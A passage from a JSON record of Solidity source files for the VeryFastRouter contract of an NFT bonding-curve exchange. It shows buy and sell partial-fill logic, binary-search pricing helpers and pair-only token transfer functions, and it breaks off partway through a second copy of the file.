priceToFillAt,\n                                swapOrder.tokenRecipient,\n                                true,\n                                msg.sender\n                            );\n                        }\n                    }\n                }\n            }\n            results[i] = outputAmount;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // Go through each buy order\n        for (uint256 i; i < swapOrder.buyOrders.length;) {\n            BuyOrderWithPartialFill calldata order = swapOrder.buyOrders[i];\n\n            // @dev We use inputAmount to store the spot price temporarily before it's overwritten\n            // (yes, it's gross)\n            uint256 inputAmount = order.pair.spotPrice();\n\n            // If the spot price parameter seen is what we expect it to be...\n            if (inputAmount == order.expectedSpotPrice) {\n                // Then do a direct swap for all items we want\n                inputAmount = order.pair.swapTokenForSpecificNFTs{value: order.ethAmount}(\n                    order.nftIds, order.maxInputAmount, swapOrder.nftRecipient, true, msg.sender\n                );\n\n                // Deduct ETH amount if it's an ETH swap\n                if (order.ethAmount != 0) {\n                    ethAmount -= inputAmount;\n                }\n            }\n            // Otherwise, we need to do some partial fill calculations first\n            else {\n                uint256 numItemsToFill;\n                uint256 priceToFillAt;\n\n                {\n                    (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(\n                        order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE\n                    );\n\n                    // uint128(inputAmount) is safe because order.pair.spotPrice() returns uint128\n                    (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForBuy(\n                        order.pair, uint128(inputAmount), order.maxCostPerNumNFTs, protocolFeeMultiplier, royaltyAmount\n                    );\n                }\n\n                // Set inputAmount to be 0 (assuming we don't fully meet all criteria for a swap)\n                inputAmount = 0;\n\n                // Continue if we can fill at least 1 item\n                if (numItemsToFill != 0) {\n                    // Set ETH amount to send (is 0 if it's an ERC20 swap)\n                    uint256 ethToSendForBuy;\n                    if (order.ethAmount != 0) {\n                        ethToSendForBuy = priceToFillAt;\n                    }\n\n                    // If ERC721 swap\n                    if (order.isERC721) {\n                        // Get list of actually valid ids to buy\n                        uint256[] memory availableIds = _findAvailableIds(order.pair, numItemsToFill, order.nftIds);\n\n                        // Only swap if there are valid IDs to buy\n                        if (availableIds.length != 0) {\n                            inputAmount = order.pair.swapTokenForSpecificNFTs{value: ethToSendForBuy}(\n                                availableIds, priceToFillAt, swapOrder.nftRecipient, true, msg.sender\n                            );\n                        }\n                    }\n                    // If ERC1155 swap\n                    else {\n                        // The amount to buy is the min(numItemsToFill, erc1155.balanceOf(pair))\n                        {\n                            uint256 availableNFTs = IERC1155(order.pair.nft()).balanceOf(\n                                address(order.pair), LSSVMPairERC1155(address(order.pair)).nftId()\n                            );\n                            numItemsToFill = numItemsToFill < availableNFTs ? numItemsToFill : availableNFTs;\n                        }\n\n                        // Only continue if we can fill for nonzero amount of items\n                        if (numItemsToFill != 0) {\n                            // Do the 1155 swap, with the modified amount to buy\n                            inputAmount = order.pair.swapTokenForSpecificNFTs{value: ethToSendForBuy}(\n                                _wrapUintAsArray(numItemsToFill),\n                                priceToFillAt,\n                                swapOrder.nftRecipient,\n                                true,\n                                msg.sender\n                            );\n                        }\n                    }\n\n                    // Deduct ETH amount if it's an ETH swap\n                    if (order.ethAmount != 0) {\n                        ethAmount -= inputAmount;\n                    }\n                }\n            }\n            // Store inputAmount in results\n            results[i + swapOrder.sellOrders.length] = inputAmount;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // Send excess ETH back to token recipient\n        if (ethAmount != 0) {\n            payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount);\n        }\n    }\n\n    receive() external payable {}\n\n    /**\n     * Internal helper functions\n     */\n\n    /**\n     *   @dev Performs a binary search to find the largest value where maxCostPerNumNFTs is still greater than\n     *   the pair's bonding curve's getBuyInfo() value.\n     *   @param pair The pair to calculate partial fill values for\n     *   @param maxCostPerNumNFTs The user's specified maximum price to pay for filling a number of NFTs\n     *   @param protocolFeeMultiplier The % set as protocol fee\n     *   @param royaltyAmount Royalty amount assuming a cost of BASE, used for cheaper royalty calc\n     *   @dev Note that maxPricesPerNumNFTs is 0-indexed\n     */\n    function _findMaxFillableAmtForBuy(\n        LSSVMPair pair,\n        uint128 spotPrice,\n        uint256[] memory maxCostPerNumNFTs,\n        uint256 protocolFeeMultiplier,\n        uint256 royaltyAmount\n    ) internal view returns (uint256 numItemsToFill, uint256 priceToFillAt) {\n        // Set start and end indices\n        uint256 start = 1;\n        uint256 end = maxCostPerNumNFTs.length;\n\n        // Cache current pair values\n        uint128 delta = pair.delta();\n        uint256 feeMultiplier = pair.fee();\n\n        // Perform binary search\n        while (start <= end) {\n            // uint256 numItems = (start + end)/2; (but we hard-code it below to avoid stack too deep)\n\n            // We check the price to buy index + 1\n            (\n                CurveErrorCodes.Error error,\n                /* newSpotPrice */\n                ,\n                /* newDelta */\n                ,\n                uint256 currentCost,\n                /* tradeFee */\n                ,\n                /* protocolFee */\n            ) = pair.bondingCurve().getBuyInfo(\n                spotPrice, delta, (start + end) / 2, feeMultiplier, protocolFeeMultiplier\n            );\n\n            currentCost += currentCost * royaltyAmount / BASE;\n\n            // If the bonding curve has a math error, or\n            // If the current price is too expensive relative to our max cost,\n            // then we recurse on the left half (i.e. less items)\n            if (\n                error != CurveErrorCodes.Error.OK || currentCost > maxCostPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */\n            ) {\n                end = (start + end) / 2 - 1;\n            }\n            // Otherwise, we recurse on the right half (i.e. more items)\n            else {\n                numItemsToFill = (start + end) / 2;\n                start = (start + end) / 2 + 1;\n                priceToFillAt = currentCost;\n            }\n        }\n    }\n\n    function _findMaxFillableAmtForSell(\n        LSSVMPair pair,\n        uint128 spotPrice,\n        uint256[] memory minOutputPerNumNFTs,\n        uint256 protocolFeeMultiplier,\n        uint256 royaltyAmount\n    ) internal view returns (uint256 numItemsToFill, uint256 priceToFillAt) {\n        // Set start and end indices\n        uint256 start = 1;\n        uint256 end = minOutputPerNumNFTs.length;\n\n        // Cache current pair values\n        uint256 deltaAndFeeMultiplier;\n        {\n            uint128 delta = pair.delta();\n            uint96 feeMultiplier = pair.fee();\n            deltaAndFeeMultiplier = uint256(delta) << 96 | feeMultiplier;\n        }\n        uint256 pairTokenBalance = getPairBaseQuoteTokenBalance(pair);\n\n        // Perform binary search\n        while (start <= end) {\n            // We check the price to sell index + 1\n            (\n                CurveErrorCodes.Error error,\n                /* newSpotPrice */\n                ,\n                /* newDelta */\n                ,\n                uint256 currentOutput,\n                /* tradeFee */\n                ,\n                /* protocolFee */\n            ) = pair.bondingCurve().getSellInfo(\n                spotPrice,\n                // get delta from deltaAndFeeMultiplier\n                uint128(deltaAndFeeMultiplier >> 96),\n                (start + end) / 2,\n                // get feeMultiplier from deltaAndFeeMultiplier\n                uint96(deltaAndFeeMultiplier),\n                protocolFeeMultiplier\n            );\n            currentOutput -= currentOutput * royaltyAmount / BASE;\n            // If the bonding curve has a math error, or\n            // if the current output is too low relative to our max output, or\n            // if the current output is greater than the pair's token balance,\n            // then we recurse on the left half (i.e. less items)\n            if (\n                error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */\n                    || currentOutput > pairTokenBalance\n            ) {\n                end = (start + end) / 2 - 1;\n            }\n            // Otherwise, we recurse on the right half (i.e. more items)\n            else {\n                numItemsToFill = (start + end) / 2;\n                start = (start + end) / 2 + 1;\n                priceToFillAt = currentOutput;\n            }\n        }\n    }\n\n    /**\n     *   @dev Checks ownership of all desired NFT IDs to see which ones are still fillable\n     *   @param pair The pair to check for ownership\n     *   @param maxIdsNeeded The maximum amount of NFTs we want, guaranteed to be up to potentialIds.length, but could be less\n     *   @param potentialIds The possible NFT IDs that the pair could own\n     *   @return idsToBuy Actual NFT IDs owned by the pair, guaranteed to be up to maxIdsNeeded length, but could be less\n     */\n    function _findAvailableIds(LSSVMPair pair, uint256 maxIdsNeeded, uint256[] memory potentialIds)\n        internal\n        view\n        returns (uint256[] memory)\n    {\n        IERC721 nft = IERC721(pair.nft());\n        uint256[] memory idsThatExist = new uint256[](maxIdsNeeded);\n        uint256 numIdsFound = 0;\n\n        // Go through each potential ID, and check to see if it's still owned by the pair\n        // If it is, record the ID\n        for (uint256 i; i < maxIdsNeeded;) {\n            if (nft.ownerOf(potentialIds[i]) == address(pair)) {\n                idsThatExist[numIdsFound] = potentialIds[i];\n                numIdsFound += 1;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n        // If all ids were found, return the full id list\n        if (numIdsFound == maxIdsNeeded) {\n            return idsThatExist;\n        }\n        // Otherwise, we didn't find enough IDs, so we need to return a subset\n        if (numIdsFound < maxIdsNeeded) {\n            uint256[] memory allIdsFound = new uint256[](numIdsFound);\n            for (uint256 i; i < numIdsFound;) {\n                allIdsFound[i] = idsThatExist[i];\n\n                unchecked {\n                    ++i;\n                }\n            }\n            return allIdsFound;\n        }\n        uint256[] memory emptyArr = new uint256[](0);\n        return emptyArr;\n    }\n\n    /**\n     * Restricted functions\n     */\n\n    /**\n     * @dev Allows an ERC20 pair contract to transfer ERC20 tokens directly from\n     *     the sender, in order to minimize the number of token transfers. Only callable by an ERC20 pair.\n     *     @param token The ERC20 token to transfer\n     *     @param from The address to transfer tokens from\n     *     @param to The address to transfer tokens to\n     *     @param amount The amount of tokens to transfer\n     */\n    function pairTransferERC20From(ERC20 token, address from, address to, uint256 amount) external {\n        // verify caller is a trusted ERC20 pair contract\n        if (\n            !(\n                factory.isValidPair(msg.sender)\n                    && factory.getPairTokenType(msg.sender) == ILSSVMPairFactoryLike.PairTokenType.ERC20\n            )\n        ) {\n            revert VeryFastRouter__InvalidPair();\n        }\n\n        // transfer tokens to pair\n        token.safeTransferFrom(from, to, amount);\n    }\n\n    /**\n     * @dev Allows a pair contract to transfer ERC721 NFTs directly from\n     *     the sender, in order to minimize the number of token transfers. Only callable by a pair.\n     *     @param nft The ERC721 NFT to transfer\n     *     @param from The address to transfer tokens from\n     *     @param to The address to transfer tokens to\n     *     @param id The ID of the NFT to transfer\n     */\n    function pairTransferNFTFrom(IERC721 nft, address from, address to, uint256 id) external {\n        // verify caller is a trusted pair contract\n        if (\n            !(\n                factory.isValidPair(msg.sender)\n                    && factory.getPairNFTType(msg.sender) == ILSSVMPairFactoryLike.PairNFTType.ERC721\n            )\n        ) {\n            revert VeryFastRouter__InvalidPair();\n        }\n\n        // transfer NFTs to pair\n        nft.transferFrom(from, to, id);\n    }\n\n    /**\n     * @dev Allows a pair contract to transfer ERC1155 NFTs directly from\n     *     the sender, in order to minimize the number of token transfers. Only callable by a pair.\n     *     @param nft The ERC1155 NFT to transfer\n     *     @param from The address to transfer tokens from\n     *     @param to The address to transfer tokens to\n     *     @param ids The IDs of the NFT to transfer\n     *     @param amounts The amount of each ID to transfer\n     */\n    function pairTransferERC1155From(\n        IERC1155 nft,\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata amounts\n    ) external {\n        // verify caller is a trusted pair contract\n        if (\n            !(\n                factory.isValidPair(msg.sender)\n                    && factory.getPairNFTType(msg.sender) == ILSSVMPairFactoryLike.PairNFTType.ERC1155\n            )\n        ) {\n            revert VeryFastRouter__InvalidPair();\n        }\n\n        // transfer NFTs to pair\n        nft.safeBatchTransferFrom(from, to, ids, amounts, bytes(\"\"));\n    }\n}"
    },
    {
      "filename": "src/VeryFastRouter.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0\npragma solidity ^0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\n\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\";\n\nimport {LSSVMPair} from \"./LSSVMPair.sol\";\nimport {LSSVMPairERC20} from \"./LSSVMPairERC20.sol\";\nimport {ILSSVMPairERC721} from \"./erc721/ILSSVMPairERC721.sol\";\nimport {LSSVMPairERC1155} from \"./erc1155/LSSVMPairERC1155.sol\";\nimport {ILSSVMPairFactoryLike} from \"./ILSSVMPairFactoryLike.sol\";\nimport {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";\n\n/**\n * @dev Full-featured router to handle all swap types, with partial fill support\n */\ncontract VeryFastRouter {\n    using SafeTransferLib for address payable;\n    using SafeTransferLib for ERC20;\n\n    uint256 constant BASE = 1e18;\n\n    ILSSVMPairFactoryLike public immutable factory;\n\n    struct BuyOrderWithPartialFill {\n        LSSVMPair pair;\n        bool isERC721;\n        uint256[] nftIds;\n        uint256 maxInputAmount;\n        uint256 ethAmount;\n        uint256 expectedSpotPrice;\n        uint256[] maxCostPerNumNFTs; // @dev This is zero-indexed, so maxCostPerNumNFTs[x] = max price we're willing to pay to buy x+1 NFTs\n    }\n\n    struct SellOrderWithPartialFill {\n        LSSVMPair pair;\n        bool isETHSell;\n        bool isERC721;\n        uint256[] nftIds;\n        bool doPropertyCheck;\n        bytes propertyCheckParams;\n        uint128 expectedSpotPrice;\n        uint256 minExpectedOutput;\n        uint256[] minExpectedOutputPerNumNFTs;\n    }\n\n    struct Order {\n        BuyOrderWithPartialFill[] buyOrders;\n        SellOrderWithPartialFill[] sellOrders;\n        address payable tokenRecipient;\n        address nftRecipient;\n        bool recycleETH;\n    }\n\n    struct PartialFillSellArgs {\n        LSSVMPair pair;\n        uint128 spotPrice;\n        uint256 maxNumNFTs;\n        uint256[] minOutputPerNumNFTs;\n        uint256 protocolFeeMultiplier;\n        uint256 nftId;\n    }\n\n    struct PartialFillSellHelperArgs {\n        LSSVMPair pair;\n        uint256[] minOutputPerNumNFTs;\n        uint256 protocolFeeMultiplier;\n        uint256 nftId;\n        uint256 start;\n        uint256 end;\n        uint128 delta;\n        uint128 spotPrice;\n        uint256 feeMultiplier;\n        uint256 pairTokenBalance;\n        uint256 royaltyAmount;\n        uint256 numItemsToFill;\n        uint256 priceToFillAt;\n    }\n\n    error VeryFastRouter__InvalidPair();\n    error VeryFastRouter__BondingCurveQuoteError();\n\n    constructor(ILSSVMPairFactoryLike _factory) {\n        factory = _factory;\n    }\n\n    /* @dev Meant to be used as a client-side utility\n     * Given a pair and a number of items to buy, calculate the max price paid for 1 up to numNFTs to buy\n     */\n    function getNFTQuoteForBuyOrderWithPartialFill(\n        LSSVMPair pair,\n        uint256 numNFTs,\n        uint256 slippageScaling,\n        uint256 assetId\n    ) external view returns (uint256[] memory) {\n        uint256[] memory prices = new uint256[](numNFTs);\n\n        for (uint256 i; i < numNFTs;) {\n            uint128 newSpotPrice = pair.spotPrice();\n            uint128 newDelta = pair.delta();\n\n            // Assume that i items"
    }
  ]
}